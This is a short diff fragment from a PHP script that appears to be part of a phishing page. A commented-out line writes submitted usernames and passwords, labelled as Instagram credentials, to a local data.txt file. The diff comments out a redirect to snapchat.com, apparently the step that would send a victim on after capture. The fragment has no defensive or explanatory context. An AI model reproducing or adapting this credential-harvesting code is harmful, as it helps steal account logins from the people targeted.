@@ -46,6 +46,6 @@ try {
 // $write = file_put_contents('data.txt', "Insta user: {$_POST['username']} pass: {$_POST['password']}" . PHP_EOL, FILE_APPEND);
 // var_dump($write);
 
-header('Location: https://snapchat.com');
-exit();
+// header('Location: https://snapchat.com');
+// exit();
 ?> 
